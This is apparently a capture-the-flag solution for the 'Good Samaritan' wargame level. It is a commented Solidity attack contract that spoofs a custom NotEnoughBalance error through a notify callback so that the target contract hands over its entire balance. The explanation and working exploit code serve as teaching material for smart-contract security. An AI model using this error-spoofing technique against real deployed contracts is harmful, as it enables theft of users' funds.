/*
    Kind of a easy one after a long time, this level won't be really difficult and gonna make u learn some more about errors in solidity and why not to fckin instantiate a direct error in try/catch block

    Well, let's begin..

    Just you need to copy down the code in remix and deploy that...

    Before that, Hope you must have gone through the question provided and understood it well (It's really easy to grab up what's going on)

    So, the vulnerability is in two ways, first in the wallet contract, there's an error defined (NotEnoughBalance) which is a right thing to do, but that same error is checked inside the Good Samaritan contract which is way of getting all the funds of this contract, just realise if someone thrown this error, he or she will get all the damn funds...

    Next vulnerability (the main one) is in the Coin contract, in which it uses the interface 'INotifyable' to notify the other contracts about the amount deposited, which means someone can easily create an attacking contract and put inside some malicious code which acts as an entry of a attack
    And that's what we have done here

    This attack contract implements that notify function which is to be callled inside the 'transfer' function of that coin contract...It's just reverts that 'NotEnoughBalance' error which will be thrown right back in 'requestDonation' function of contract 'Good Samaritan'

    Just deploy it, run the attack and We are good to go!!
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface GoodSamaritan{
    function requestDonation() external returns(bool);
}

contract Attack{
    GoodSamaritan public target;

    error NotEnoughBalance();

    constructor(address _victim){
        target = GoodSamaritan(_victim);
    }

    function notify(uint256 amount) pure external{
        if (amount <= 10){
            revert NotEnoughBalance();
        }
    }

    function attack() external {
        target.requestDonation();
    }

}